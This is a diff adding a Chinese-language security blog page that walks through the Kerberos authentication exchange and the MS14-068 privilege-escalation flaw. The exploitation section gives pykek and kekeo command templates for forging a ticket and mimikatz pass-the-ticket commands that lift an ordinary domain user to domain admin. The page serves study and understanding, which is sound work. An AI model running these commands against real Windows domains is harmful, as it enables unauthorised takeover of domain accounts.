@@ -1,0 +1,221 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <meta name="Keywords" content="blog"/>
+    <meta name="Description" content="blog"/>
+    <title>Simple</title>
+    <link rel="shortcut icon" href="/static/favicon.png"/>
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+</head>
+<body>
+<div class="main">
+    <div class="header">
+    	<ul id="pages">
+            <li><a href="/">home</a></li>
+            <li><a href="/#/tags">tags</a></li>
+            <li><a href="/#/archive">archive</a></li>
+    	</ul>
+    </div>
+	<div class="wrap-header">
+    <h1>
+    <a href="/" id="title"></a>
+    </h1>
+	</div>
+<xmp id="md" style="display: none;">
+<!-- markdown -->
+## Kerberos 认证流程
+
+KDC(Key Distribution Center) 包含 AS(Authentication Server) 和 TGS(Ticket Granting Server).
+
+一次完整的 Kerberos 请求需要 Client Server KDC 的共同参与, 故称为 Kerberos (三只狗头).
+
+### KRB\_AS\_REQ
+
+Client 向 AS 发送用户名, 以用户 Hash 加密的时间戳及 Client 信息.
+
+### KRB\_AS\_REP
+
+AS 检测用户名是否有效, 之后生成一串随机字符作为 session-key, 并发送以用户 Hash 加密的 session-key, 以 krbtgt Hash 加密的 session-key 和时间戳作为 TGT(Ticket Granting Ticket).
+
+### KRB\_TGS\_REQ
+
+Client 通过用户 Hash 解密获得 session-key, 再将 TGT 与以 session-key 加密的时间戳发送给 TGS.
+
+
+### KRB\_TGS\_REP
+
+TGS 通过 krbtgt Hash 解密获得 session-key 和时间戳并检测有效性, 然后发送以 Server Hash 加密的 session-key-1 作为 TGS Ticket(Service Ticket) 和以 session-key 加密的 session-key-1.
+
+### KRB\_AP\_REQ
+
+Client 通过 session-key 解密获得 session-key-1, 并向 Server 发送 TGS Ticket 和以 session-key-1 加密的时间戳.
+
+### KRB\_AP\_REP
+
+Server 通过 Server Hash 解密 TGS Ticket 获得 session-key-1, 之后再次解密得到时间戳, 最后验证有效性.
+
+## ms14-068
+
+ms14-068 可将域内普通用户提升至域管理员权限. 其原理为在 Kerberos 认证流程中 Client 可拒绝向 AS 请求 PAC 以构造一份伪造的 PAC 欺骗 TGT. 
+
+### pykek
+
+通过 pykek 利用.
+
+```
+pykek -u <userName>@<domainName> -s <userSid> -d <domainControllerAddr> [-p <clearPassword>|--rc4 <ntlmHash>]
+```
+
+```
+mimikatz "kerberos::ptc ticket.ccache" "exit"
+```
+
+### kekeo
+
+通过 kekeo 利用.
+
+```
+ms14-068 /user:<userName> /domain:<domainName> /dc:<domainControllerAddr> /sid:<userSid> /password:<clearPassword> [/ptt]
+```
+
+```
+mimikatz "kerberos::ptt ticket.kirbi" "exit"
+```
+
+利用时无须本地管理员权限. 域内用户也能通过以上两种方式 ptt.
+
+注意如果在 windows 2003 中是无法通过 `kerberos::ptt` 和 `kerberos::ptc` 来导入凭据的.
+<!-- markdown end -->
+</xmp>
+<div class="entry" id="main">
+<!-- content -->
+<h2 id="kerberos">Kerberos 认证流程</h2>
+
+<p>KDC(Key Distribution Center) 包含 AS(Authentication Server) 和 TGS(Ticket Granting Server).</p>
+
+<p>一次完整的 Kerberos 请求需要 Client Server KDC 的共同参与, 故称为 Kerberos (三只狗头).</p>
+
+<h3 id="krb_as_req">KRB_AS_REQ</h3>
+
+<p>Client 向 AS 发送用户名, 以用户 Hash 加密的时间戳及 Client 信息.</p>
+
+<h3 id="krb_as_rep">KRB_AS_REP</h3>
+
+<p>AS 检测用户名是否有效, 之后生成一串随机字符作为 session-key, 并发送以用户 Hash 加密的 session-key, 以 krbtgt Hash 加密的 session-key 和时间戳作为 TGT(Ticket Granting Ticket).</p>
+
+<h3 id="krb_tgs_req">KRB_TGS_REQ</h3>
+
+<p>Client 通过用户 Hash 解密获得 session-key, 再将 TGT 与以 session-key 加密的时间戳发送给 TGS.</p>
+
+<h3 id="krb_tgs_rep">KRB_TGS_REP</h3>
+
+<p>TGS 通过 krbtgt Hash 解密获得 session-key 和时间戳并检测有效性, 然后发送以 Server Hash 加密的 session-key-1 作为 TGS Ticket(Service Ticket) 和以 session-key 加密的 session-key-1.</p>
+
+<h3 id="krb_ap_req">KRB_AP_REQ</h3>
+
+<p>Client 通过 session-key 解密获得 session-key-1, 并向 Server 发送 TGS Ticket 和以 session-key-1 加密的时间戳.</p>
+
+<h3 id="krb_ap_rep">KRB_AP_REP</h3>
+
+<p>Server 通过 Server Hash 解密 TGS Ticket 获得 session-key-1, 之后再次解密得到时间戳, 最后验证有效性.</p>
+
+<h2 id="ms14068">ms14-068</h2>
+
+<p>ms14-068 可将域内普通用户提升至域管理员权限. 其原理为在 Kerberos 认证流程中 Client 可拒绝向 AS 请求 PAC 以构造一份伪造的 PAC 欺骗 TGT. </p>
+
+<h3 id="pykek">pykek</h3>
+
+<p>通过 pykek 利用.</p>
+
+<pre><code>pykek -u &lt;userName&gt;@&lt;domainName&gt; -s &lt;userSid&gt; -d &lt;domainControllerAddr&gt; [-p &lt;clearPassword&gt;|--rc4 &lt;ntlmHash&gt;]
+</code></pre>
+
+<pre><code>mimikatz "kerberos::ptc ticket.ccache" "exit"
+</code></pre>
+
+<h3 id="kekeo">kekeo</h3>
+
+<p>通过 kekeo 利用.</p>
+
+<pre><code>ms14-068 /user:&lt;userName&gt; /domain:&lt;domainName&gt; /dc:&lt;domainControllerAddr&gt; /sid:&lt;userSid&gt; /password:&lt;clearPassword&gt; [/ptt]
+</code></pre>
+
+<pre><code>mimikatz "kerberos::ptt ticket.kirbi" "exit"
+</code></pre>
+
+<p>利用时无须本地管理员权限. 域内用户也能通过以上两种方式 ptt.</p>
+
+<p>注意如果在 windows 2003 中是无法通过 <code>kerberos::ptt</code> 和 <code>kerberos::ptc</code> 来导入凭据的.</p>
+<!-- content end -->
+</div>
+<br>
+<br>
+    <div id="disqus_thread"></div>
+	<div class="footer">
+		<p>© Copyright 2017-2019 by X1r0z</p>
+	</div>
+</div>
+<script src="main.js"></script>
+<script id="content" type="text/mustache">
+    <h1>{{title}}</h1>
+    <div class="tag">
+    {{date}}
+    {{#tags}}
+    <a href="/#/tag/{{name}}">#{{name}}</a>
+    {{/tags}}
+    </div>
+</script>
+<script id="pagesTemplate" type="text/mustache">
+    {{#pages}}
+    <li>
+        <a href="{{path}}">{{title}}</a>
+    </li>
+    {{/pages}}
+</script>
+<script>
+$(document).ready(function() {
+    $.ajax({
+        url: "main.json",
+        type: "GET",
+        dataType: "json",
+        success: function(data) {
+            $("#title").html(data.name);
+            var pagesTemplate = Hogan.compile($("#pagesTemplate").html());
+            var pagesHtml = pagesTemplate.render({"pages": data.pages});
+            $("#pages").append(pagesHtml);
+            //path
+            var path = "ms14-068-playing-with-kerberos.html";
+            //path end
+            var now = 0;
+            for (var i = 0; i < data.posts.length; ++i)
+                if (path == data.posts[i].path)
+                    now = i;
+            var post = data.posts[now];
+            var tmp = post.tags.split(" ");
+            var tags = [];
+            for (var i = 0; i < tmp.length; ++i)
+                if (tmp[i].length > 0)
+                    tags.push({"name": tmp[i]});
+            var contentTemplate = Hogan.compile($("#content").html());
+            var contentHtml = contentTemplate.render({"title": post.title, "tags": tags, "date": post.date});
+            $("#main").prepend(contentHtml);
+            if (data.disqus_shortname.length > 0) {
+                var disqus_shortname = data.disqus_shortname;
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            }
+        }
+    });
+});
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$'], ["\\(", "\\)"]], processEscapes: true}});
+</script>
+</body>
+</html>
